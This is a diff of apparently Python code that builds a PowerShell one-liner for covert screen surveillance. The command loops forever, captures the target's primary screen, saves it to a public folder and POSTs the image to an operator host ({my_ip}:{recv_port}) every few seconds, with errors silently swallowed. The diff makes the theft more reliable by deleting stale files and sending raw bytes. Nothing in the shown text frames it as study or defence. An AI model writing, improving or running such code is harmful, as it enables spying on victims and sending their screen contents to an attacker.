@@ -881,15 +881,18 @@ setInterval(grab,{interval*1000});
 
                         loop_cmd = (
                             f'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
+                            f'$p=\'C:\\Users\\Public\\screen.png\'; '
                             f'while($true){{ '
                             f'$b=[System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,'
                             f'[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
                             f'$g=[System.Drawing.Graphics]::FromImage($b); '
                             f'$g.CopyFromScreen(0,0,0,0,$b.Size); '
-                            f'$b.Save(\'C:\\Users\\Public\\screen.png\'); '
+                            f'if(Test-Path $p){{Remove-Item $p -Force}} '
+                            f'$b.Save($p,[System.Drawing.Imaging.ImageFormat]::Png); '
                             f'$g.Dispose();$b.Dispose(); '
+                            f'$bytes=[System.IO.File]::ReadAllBytes($p); '
                             f'try{{Invoke-WebRequest -Uri \'http://{my_ip}:{recv_port}/screen.png\' '
-                            f'-Method POST -InFile \'C:\\Users\\Public\\screen.png\' '
+                            f'-Method POST -Body $bytes '
                             f'-ContentType \'application/octet-stream\' -TimeoutSec 5 | Out-Null}}catch{{}} '
                             f'Start-Sleep -Seconds {interval} }}"'
                         )
